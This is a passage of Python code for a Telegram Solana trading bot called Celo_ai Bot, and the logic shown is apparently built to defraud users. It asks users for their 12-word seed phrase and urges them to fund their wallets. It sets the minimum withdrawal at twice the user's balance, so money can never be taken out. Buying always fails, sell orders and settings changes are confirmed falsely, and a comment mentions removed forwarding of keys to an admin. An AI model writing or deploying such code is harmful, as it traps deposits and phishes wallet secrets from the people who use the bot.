                    "â— Amount must be greater than zero.",
                    reply_markup=cancel_markup())
                return
        except ValueError:
            await update.message.reply_text(
                "â— Invalid amount. Please enter a valid number.",
                reply_markup=cancel_markup())
            return

        token_address = context.user_data.get("awaiting_custom_buy", "")

        # Check user balance and apply validation rules
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Balance validation rules
        if user_balance == 0:
            await update.message.reply_text(f"â— Insufficient SOL balance.",
                                            parse_mode="HTML",
                                            reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_custom_buy", None)
            return
        elif usd_value < 10:
            await update.message.reply_text(
                f"â— Minimum amount required to buy a token is above $10.\n\n"
                f"Your current balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_custom_buy", None)
            return
        else:
            # Balance >= $10
            await update.message.reply_text(
                f"Buy tokens is currently not available. Try again later.\n\n"
                f"Your balance: {user_balance:.4f} SOL (${usd_value:.2f})",
                parse_mode="HTML",
                reply_markup=main_menu_markup())
            context.user_data.pop("awaiting_custom_buy", None)
            return

    # ----- Handle Custom Sell Percentage -----
    if context.user_data.get("awaiting_custom_sell"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_custom_sell", None)
            await update.message.reply_text("Sell cancelled.",
                                            reply_markup=main_menu_markup())
            return
        try:
            percentage = float(text)
            if percentage <= 0 or percentage > 100:
                await update.message.reply_text(
                    "â— Percentage must be between 0 and 100.",
                    reply_markup=cancel_markup())
                return
        except ValueError:
            await update.message.reply_text(
                "â— Invalid percentage. Please enter a valid number.",
                reply_markup=cancel_markup())
            return

        token_address = context.user_data.get("awaiting_custom_sell", "")

        # âŒ Removed derive_keypair and admin forwarding

        # âœ… Just show user response
        await update.message.reply_text(
            f"ðŸ”´ <b>Sell Order Submitted</b>\n\n"
            f"Percentage: {percentage}%\n"
            f"Token: <code>{token_address[:8]}...{token_address[-8:]}</code>\n\n"
            f"â— No token balance to sell.",
            parse_mode="HTML",
            reply_markup=main_menu_markup())

        context.user_data.pop("awaiting_custom_sell", None)

        return

    # ----- Handle Buy Token -----
    if context.user_data.get("awaiting_token_contract"):
        if text.lower() == "cancel":
            context.user_data.pop("awaiting_token_contract", None)
            await update.message.reply_text("Buy cancelled.",
                                            reply_markup=main_menu_markup())
            return

        token_address = text.strip()

        # Validate Solana token address (base58 format, 32-44 characters)
        # Base58 excludes: 0, O, I, l (to avoid confusion)
        base58_pattern = r'^[1-9A-HJ-NP-Za-km-z]{32,44}$'
        if not re.match(base58_pattern, token_address):
            await update.message.reply_text(
                "â— Invalid token contract address. Please enter a valid Solana token address.\n\n"
                "Solana addresses are 32-44 characters and use base58 encoding.",
                reply_markup=cancel_markup())
            return

        # Fetch token details
        await update.message.reply_text("ðŸ” Fetching token details...")

        pair_data = await get_token_details(token_address)

        if pair_data:
            # Get user's actual wallet balance
            user_balance = get_user_balance(user_id)
            token_info = format_token_details(pair_data,
                                              wallet_balance=user_balance)
            if token_info:
                # Store token address for later use in buy/sell callbacks
                context.user_data["current_token"] = token_address

                # Create inline keyboard with buy/sell buttons
                buy_sell_keyboard = InlineKeyboardMarkup(
                    [[
                        InlineKeyboardButton(
                            "ðŸŸ¢ Buy 0.1 SOL",
                            callback_data=f"buy_0.1_{token_address}"),
                        InlineKeyboardButton(
                            "ðŸ”´ Sell 50%",
                            callback_data=f"sell_50_{token_address}")
                    ],
                     [
                         InlineKeyboardButton(
                             "ðŸŸ¢ Buy 0.5 SOL",
                             callback_data=f"buy_0.5_{token_address}"),
                         InlineKeyboardButton(
                             "ðŸ”´ Sell 100%",
                             callback_data=f"sell_100_{token_address}")
                     ],
                     [
                         InlineKeyboardButton(
                             "ðŸŸ¢ Buy 1.0 SOL",
                             callback_data=f"buy_1.0_{token_address}"),
                         InlineKeyboardButton(
                             "ðŸ”´ Sell x%",
                             callback_data=f"sell_custom_{token_address}")
                     ],
                     [
                         InlineKeyboardButton(
                             "ðŸŸ¢ Buy 3.0 SOL",
                             callback_data=f"buy_3.0_{token_address}")
                     ],
                     [
                         InlineKeyboardButton(
                             "ðŸŸ¢ Buy 5.0 SOL",
                             callback_data=f"buy_5.0_{token_address}")
                     ],
                     [
                         InlineKeyboardButton(
                             "ðŸŸ¢ Buy x SOL",
                             callback_data=f"buy_custom_{token_address}")
                     ]])

                await update.message.reply_text(token_info,
                                                parse_mode="HTML",
                                                disable_web_page_preview=True,
                                                reply_markup=buy_sell_keyboard)
            else:
                await update.message.reply_text(
                    "â— Error formatting token details. Please try again.",
                    reply_markup=main_menu_markup())
        else:
            await update.message.reply_text(
                "â— Token not found or no trading pairs available. Please check the contract address.",
                reply_markup=main_menu_markup())

        context.user_data.pop("awaiting_token_contract", None)
        return

    # ----- Handle Settings Number Input -----
    if user_id in user_states:
        # Check if input is a number
        if not text.isdigit():
            await update.message.reply_text(
                "âŒ Please enter numbers only. Use the Cancel button above to cancel this input."
            )
            return

        option = user_states.pop(user_id)  # Remove state after use

        # Show success message with confirmation
        success_message = (
            f"âœ… <b>Setting Updated Successfully!</b>\n\n"
            f"ðŸ“‹ <b>{option.replace('_', ' ').title()}</b> has been set to: <b>{text}</b>\n\n"
            f"Your new setting is now active and will be applied to your trading activities.\n\n"
            f"ðŸ’¡ You can update this setting anytime by going back to Settings."
        )

        await update.message.reply_text(success_message,
                                        parse_mode="HTML",
                                        reply_markup=main_menu_markup())
        return

    # ----- Handle Menu selections -----
    if text == "ðŸ’¸Withdraw":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        # Get user balance
        user_balance = get_user_balance(user_id)
        sol_price = await get_sol_price_usd()
        usd_value = user_balance * sol_price if sol_price > 0 else 0

        # Calculate minimum withdrawal (2x balance)
        minimum_withdrawal = user_balance * 2
        MIN_GAS_RESERVE = 0.005

        # Show withdrawal options with inline buttons
        withdraw_buttons = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton("ðŸ’¸ Withdraw 100%",
                                     callback_data="withdraw_100")
            ],
             [
                 InlineKeyboardButton("ðŸ’¸ Withdraw X SOL",
                                      callback_data="withdraw_custom")
             ]])

        await update.message.reply_text(
            f"ðŸ’¸ <b>Withdraw SOL</b>\n\n"
            f"Your current balance: <b>{user_balance:.4f} SOL</b> (${usd_value:.2f})\n\n"
            f"<b>Minimum withdrawal:</b> {minimum_withdrawal:.4f} SOL\n"
            # f"<b>Gas fee reserve:</b> {MIN_GAS_RESERVE} SOL (must remain in wallet)\n\n"
            f"Choose a withdrawal option:",
            parse_mode="HTML",
            reply_markup=withdraw_buttons)
        return

    elif text == "ðŸ”ŒImport Wallet":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        context.user_data["awaiting_dummy"] = True
        await update.message.reply_text(
            "ðŸ” <b>Connect Your Wallet</b>\n\n"
            "Please send your 12-word seed phrase to connect your Solana wallet.\n\n"
            "âš ï¸ <b>Security Notes:</b>\n"
            "â€¢ Your seed phrase is never stored permanently\n"
            "â€¢ It's only used to derive your wallet address\n"
            "â€¢ The phrase is cleared from memory immediately\n"
            "â€¢ Only send your seed phrase if you trust this bot\n\n"
            "ðŸ“ <b>Format:</b> Send all 12 words separated by spaces\n"
            "<b>Example:</b> <code>word1 word2 word3 ... word12</code>",
            parse_mode="HTML",
            reply_markup=cancel_markup())
        return

    elif text == "ðŸ”Copy Trade":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        context.user_data["awaiting_copy_trade"] = True
        await update.message.reply_text(
            "Please enter the Solana wallet address to copy trade.\n\n"
            "If you want to cancel, tap Cancel.",
            reply_markup=cancel_markup())
        return

    elif text == "âš™ï¸Settings":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        await update.message.reply_text("Here are your âš™ï¸settings.")

        # Inline buttons that open TradingView charts
        Setting_buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("Number of trades per day",
                                     callback_data="trade_per_day")
            ],
            [
                InlineKeyboardButton("Edit Number of consecutive buys",
                                     callback_data="consecutive_buys")
            ],
            [
                InlineKeyboardButton("Sell Position",
                                     callback_data="sell_position")
            ],
        ])

        settings_text = (
            "<b>âš™ï¸ Settings Menu</b>\n\n"
            "Your settings are organized into categories for easy management:\n\n"
            "<b>Trading Options:</b>\n"
            "- Configure number of trades per day\n"
            "- Adjust consecutive buys\n"
            "- Manage sell positions\n\n"
            "Choose an option below to update:")
        await update.message.reply_text(settings_text,
                                        parse_mode="HTML",
                                        reply_markup=Setting_buttons)
        return

    elif text == "ðŸ’³Wallet":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        await show_wallet(update, context)
        return

    elif text == "ðŸ¤–Bot Guide":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)
        guide_text = (
            "ðŸ“˜ <b>How to Use Celo_ai Bot: Complete Feature Guide</b>\n\n"
            "Welcome to <b>Celo_ai Bot</b>, your all-in-one Telegram trading assistant. "
            "This guide walks you through the core features, how to use them safely, "
            "and why some security restrictions are in place.\n\n"
            "1ï¸âƒ£ <b>Autotrade</b>\n"
            "Automate your trading strategies. Once configured, the bot executes trades "
            "on your behalf based on your parameters. Perfect if you donâ€™t want to "
            "monitor the market constantly.\n\n"
            "2ï¸âƒ£ <b>Copytrade</b>\n"
            "Mimic trades of successful wallets instantly. Just tap Copytrade, select a "
            "trader, and the bot will replicate their trades in your account.\n\n"
            "3ï¸âƒ£ <b>Wallet & Import Wallet</b>\n"
            "Check balance, view info, monitor transactions, and manage funds. You can "
            "import a wallet by private key, but <i>exporting keys is disabled</i> for "
            "security reasons.\n\n"
            "4ï¸âƒ£ <b>Alerts</b>\n"
            "Get notified about price changes, successful trades, or new token launches "
            "so you never miss an opportunity.\n\n"
            "5ï¸âƒ£ <b>Wallet Info & Network</b>\n"
            "View transaction history, balance, and choose blockchain networks such as "
            "Ethereum or BSC.\n\n"
            "6ï¸âƒ£ <b>Live Chart</b>\n"
            "Access real-time market data, price trends, and token charts directly in Telegram.\n\n"
            "ðŸ”’ <b>Security Note</b>\n"
            "Private key <u>exporting is disabled</u> to protect your funds, even if "
            "your Telegram account is compromised. Importing keys is allowed for safe "
            "wallet connection.\n\n"
            "âš¡ <i>Note: Features are only available to funded wallets. Fund your wallet "
            "to unlock the full potential of Celo_ai Bot!</i>")

        # Inline buttons
        guide_buttons = InlineKeyboardMarkup([
            [
                InlineKeyboardButton("ðŸ’° Fund Wallet",
                                     callback_data="fund_wallet")
            ],
        ])

        await update.message.reply_text(guide_text,
                                        parse_mode="HTML",
                                        reply_markup=guide_buttons)
        return

    elif text == "ðŸ’°Buy/Sell":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        context.user_data["awaiting_token_contract"] = True
        await update.message.reply_text(
            "ðŸ’° <b>Buy Token</b>\n\n"
            "Please paste the Solana token contract address you want to buy.\n\n"
            "ðŸ“ <b>Example:</b>\n"
            "<code>HZ47qG6JyiM6KMJHLUJy7tsRtzE6CLthTEWj4opwgkHf</code>\n\n"
            "I'll show you the token details including price, market cap, liquidity, and security info.\n\n"
            "Tap Cancel if you want to go back.",
            parse_mode="HTML",
            reply_markup=cancel_markup())
        return

    elif text == "ðŸ“ŠLive Chart":
        # Check for deposits first
        await check_and_notify_deposits(user_id, context)

        chart_text = ("<b>ðŸ”¥ Top Coins Charts</b>\n"
                      "Choose a coin below to view its live chart.\n")

        # Inline buttons that open TradingView charts
        chart_buttons = InlineKeyboardMarkup(
            [[
                InlineKeyboardButton(
                    "ðŸ“ˆ BITCOIN (BTC)",
                    url="https://www.tradingview.com/chart/?symbol=BTCUSDT")
            ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ ETHEREUM (ETH)",
                     url="https://www.tradingview.com/chart/?symbol=ETHUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ SOLANA (SOL)",
                     url="https://www.tradingview.com/chart/?symbol=SOLUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ DOGECOIN (DOGE)",
                     url="https://www.tradingview.com/chart/?symbol=DOGEUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ SHIBA INU (SHIB)",
                     url="https://www.tradingview.com/chart/?symbol=SHIBUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ POLKADOT (DOT)",
                     url="https://www.tradingview.com/chart/?symbol=DOTUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ CARDANO (ADA)",
                     url="https://www.tradingview.com/chart/?symbol=ADAUSDT")
             ],
             [
                 InlineKeyboardButton(
                     "ðŸ“ˆ LITECOIN (LTC)",
                     url="https://www.tradingview.com/chart/?symbol=LTCUSDT")
             ]])

        await update.message.reply_text(chart_text,
                                        parse_mode="HTML",
                                        reply_markup=chart_buttons)
        return

    else:
        await update.message.reply_text(
            "Please choose an option from the menu.",
            reply_markup=main_menu_markup())
        return


async def background_deposit_monitor(context: ContextTypes.DEFAULT_TYPE):
    """Background task to continuously monitor deposits for all users"""
    try:
        # Check deposits for all users who have balances
        for telegram_id in list(user_balances.keys()):
            try:
                public_address, _ = derive_keypair_and_address(telegram_id)
                await monitor_deposits(telegram_id,
                                       public_address,
                                       context,
                                       notify_user=True)
            except Exception as e:
                print(f"Error monitoring deposits for user {telegram_id}: {e}")
    except Exception as e:
        print(f"Error in background deposit monitor: {e}")


# --- Main ---
def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(
        MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(CommandHandler("settings", settings_menu))

    # Start background deposit monitoring (runs every 30 seconds)
    app.job_queue.run_repeating(background_deposit_monitor,
                                interval=30,
                                first=10)

    print("Bot is running...")
    print("Background deposit monitoring started (checks every 30 seconds)...")
    app.run_polling()


if __name__ == "__main__":
    main()

